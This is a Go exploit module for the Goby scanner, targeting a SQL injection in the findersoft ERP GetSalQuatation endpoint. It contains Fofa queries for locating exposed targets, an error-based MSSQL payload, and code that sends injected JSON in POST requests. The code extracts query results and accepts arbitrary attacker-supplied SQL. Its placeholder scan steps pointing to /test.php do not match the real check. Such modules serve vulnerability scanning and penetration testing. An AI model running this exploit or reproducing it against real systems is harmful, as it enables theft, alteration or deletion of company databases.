package exploits

import (
	"encoding/json"
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "findersoft ERP System /AjaxMethods.asmx/GetSalQuatation SQL Injection Vulnerability",
    "Description": "<p>The GetSalQuatation interface in the findersoft ERP system has a SQL injection vulnerability. Attackers can construct special input parameters to inject malicious SQL code into database queries, thereby stealing, altering, or deleting data in the database.</p>",
    "Product": "findersoft ERP System",
    "Homepage": "https://findersoft.com/",
    "DisclosureDate": "2024-08-06",
    "PostTime": "2024-08-06",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "body=\"AjaxMethods.asmx/GetCompanyItem\" && body=\"password\" || body=\"方天科技\"",
    "GobyQuery": "body=\"AjaxMethods.asmx/GetCompanyItem\" && body=\"password\" || body=\"方天科技\"",
    "Level": "2",
    "Impact": "Data leakage: Attackers may steal the company’s confidential information, such as customer data and financial data.Data tampering: Attackers may alter data in the database, causing business disruption.Data loss: Attackers may delete important data, leading to business interruption.",
    "Recommendation": "<p>It is recommended that users follow the official patch release information and apply patches or upgrade to the latest version.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+(CASE WHEN (8725=8725) THEN @@VERSION ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "方天云ERP系统 /AjaxMethods.asmx/GetSalQuatation SQL 注入漏洞",
            "Product": "方天云ERP系统",
            "Description": "<p>方天云ERP系统中的GetSalQuatation接口存在SQL注入漏洞。攻击者可以通过构造特殊的输入参数，将恶意的SQL代码注入到数据库查询中，从而窃取、篡改或删除数据库中的数据。<br></p>",
            "Recommendation": "<p>建议用户关注官方补丁发布信息，打上补丁或者升级到最新版本。</p>",
            "Impact": "<p>数据泄露：攻击者可能窃取公司机密信息，如客户资料、财务数据等。</p><p>数据篡改：攻击者可能篡改数据库中的数据，导致业务混乱。</p><p>数据丢失：攻击者可能删除重要数据，导致业务中断。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "findersoft ERP System /AjaxMethods.asmx/GetSalQuatation SQL Injection Vulnerability",
            "Product": "findersoft ERP System",
            "Description": "<p>The GetSalQuatation interface in the findersoft ERP system has a SQL injection vulnerability. Attackers can construct special input parameters to inject malicious SQL code into database queries, thereby stealing, altering, or deleting data in the database.<br></p>",
            "Recommendation": "<p>It is recommended that users follow the official patch release information and apply patches or upgrade to the latest version.<br></p>",
            "Impact": "<ol><li>Data leakage: Attackers may steal the company’s confidential information, such as customer data and financial data.</li><li>Data tampering: Attackers may alter data in the database, causing business disruption.</li><li>Data loss: Attackers may delete important data, leading to business interruption.</li></ol>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9919"
}`

	sendPayload_HeiXwk := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		// POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			postRequest.Header.Store("Content-Type", "application/json")
			postRequest.Header.Store("X-Requested-With", "XMLHttpRequest")
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		// URL路径
		url := `/AjaxMethods.asmx/GetSalQuatation`
		// 拼接SQL注入语句
		body := `{ID:"` + sql + `"}`
		resp, err := setPostRequest(hostInfo, url, body)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		return resp, nil
	}
	unescapeUnicodeasd4_BjvWOq := func(source string) (string, error) {
		var unescaped string
		err := json.Unmarshal([]byte(`"`+source+`"`), &unescaped)
		if err != nil {
			return "", err
		}
		return unescaped, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sql := `(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+(CASE WHEN (8725=8725) THEN @@VERSION ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))`
			resp, err := sendPayload_HeiXwk(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qxzpq") || !strings.Contains(resp.Utf8Html, "qzvjq") {
				return false
			}
			ss.VulURL = hostInfo.FixedHostInfo + `/AjaxMethods.asmx/GetSalQuatation`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])

			switch attackType {
			case "sql":
				resp, err := sendPayload_HeiXwk(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 500") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果，匹配 qxzpq 和 qzvjq 之间的字符串
				re := regexp.MustCompile(`qxzpq(.*?)qzvjq`)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 2 {
					expResult.Output = `漏洞利用失败: 未找到匹配的内容`
					expResult.Success = false
					return expResult
				}
				// 转义处理，解决 \u003cX64\u003e 和 \n 等字符显示问题
				extractedContent, err := unescapeUnicodeasd4_BjvWOq(match[1])
				if err != nil {
					expResult.Output = `漏洞利用失败: 转义处理失败`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `Extracted content: ` + extractedContent
				return expResult

			case "sqlPoint":
				_, err := sendPayload_HeiXwk(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /AjaxMethods.asmx/GetSalQuatation HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: application/json
X-Requested-With: XMLHttpRequest

{ID:"` + sql + `"}`

				return expResult

			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
